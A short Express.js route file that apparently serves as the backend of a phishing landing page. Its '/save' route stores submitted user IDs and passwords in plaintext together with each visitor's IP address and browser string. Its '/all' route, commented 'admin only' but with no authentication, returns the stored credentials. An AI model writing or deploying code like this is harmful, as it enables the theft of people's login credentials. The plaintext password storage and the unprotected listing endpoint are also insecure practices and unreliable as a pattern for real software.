import express from 'express'
import Lead from '../models/Lead.js'

const router = express.Router()

// Save lead (user credentials)
router.post('/save', async (req, res) => {
  try {
    const { userId, password } = req.body

    // Validation
    if (!userId || !password) {
      return res.status(400).json({ 
        success: false,
        message: 'User ID and Password are required' 
      })
    }

    // Get IP address and user agent
    const ipAddress = req.headers['x-forwarded-for'] || req.connection.remoteAddress
    const userAgent = req.headers['user-agent']

    // Create lead
    const lead = await Lead.create({
      userId,
      password,
      ipAddress,
      userAgent,
      source: 'landing-page'
    })

    res.status(201).json({
      success: true,
      message: 'Credentials saved successfully',
      leadId: lead._id
    })
  } catch (error) {
    console.error('Lead save error:', error)
    res.status(500).json({ 
      success: false,
      message: 'Server error' 
    })
  }
})

// Get all leads (admin only)
router.get('/all', async (req, res) => {
  try {
    const leads = await Lead.find().sort({ createdAt: -1 }).limit(100)
    res.json({
      success: true,
      count: leads.length,
      leads
    })
  } catch (error) {
    res.status(500).json({ 
      success: false,
      message: 'Server error' 
    })
  }
})

export default router
